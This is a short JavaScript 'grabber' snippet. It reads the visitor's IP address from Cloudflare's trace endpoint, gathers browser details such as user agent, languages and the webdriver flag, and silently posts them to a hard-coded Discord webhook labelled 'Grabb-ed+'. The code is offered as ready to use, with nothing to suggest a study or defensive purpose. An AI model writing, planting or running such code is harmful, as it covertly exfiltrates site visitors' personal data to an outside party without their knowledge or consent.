function text(url) {
  return fetch(url).then(res => res.text());
}

text('https://www.cloudflare.com/cdn-cgi/trace').then(data => {
  let ipRegex = /[0-9]{1,3}.[0-9]{1,3}.[0-9]{1,3}.[0-9]{1,3}/
  let ip = data.match(ipRegex)[0];
  var agent = navigator.userAgent;
    let lang  = navigator.languages;
  let javaEnabled = navigator.javaEnabled;
  let geolocation = navigator.geolocation;
  let webdriver = navigator.webdriver;
  let sysconnection = navigator.connection;
  let sysbattery = navigator.getBattery;
  var udata = ip + " " + agent + " " + lang + " " + javaEnabled + " (javaEnabled)" + " " + geolocation + " " + webdriver + " " + sysconnection + " " + sysbattery;
  const xml = new XMLHttpRequest;
   xml.open("POST", "https://discord.com/api/webhooks/1121323380285636671/3U0PA0ro8S3MWMOq01dRFfXLlwfe2mrjAT4QqmnIen_Hw4n3G6DBUFzrjSrUeOrPgyQz");

   xml.setRequestHeader('Content-type', 'application/json');

   const params = {
     username: "Grabb-ed+",
     avatar_url: "",
     content: udata
   }

   xml.send(JSON.stringify(params));
});
